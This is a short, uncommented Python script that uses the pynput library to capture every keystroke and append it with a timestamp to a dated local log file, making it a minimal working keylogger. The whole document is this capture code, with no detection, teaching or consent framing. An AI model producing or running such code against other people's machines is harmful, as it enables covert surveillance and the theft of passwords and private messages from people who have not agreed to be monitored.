from pynput.keyboard import Key, Listener
import logging
from datetime import datetime

now = datetime.today().strftime('%Y-%m-%d')
logg = now + ".txt" 
a = Key
b = Listener
logging.basicConfig(filename=(logg), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def on_press(a):
    logging.info(str(a))
 
with b(on_press=on_press) as b :
    b.join()
    
